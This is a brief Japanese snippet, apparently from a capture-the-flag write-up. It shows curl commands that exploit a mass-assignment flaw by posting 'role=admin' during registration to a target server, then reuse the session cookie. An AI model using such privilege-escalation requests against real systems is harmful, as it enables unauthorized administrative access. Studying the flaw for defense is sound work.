```bash
curl -X POST http://34.170.146.252:64344/register \
     -d "username=guest" \
     -d "password=guest" \
     -d "role=admin" \
     -c cookies.txt

curl -b cookies.txt http://34.170.146.252:64344/
```

`role=admin`をすることで一括代入による脆弱性を突き、管理者権限で登録できる。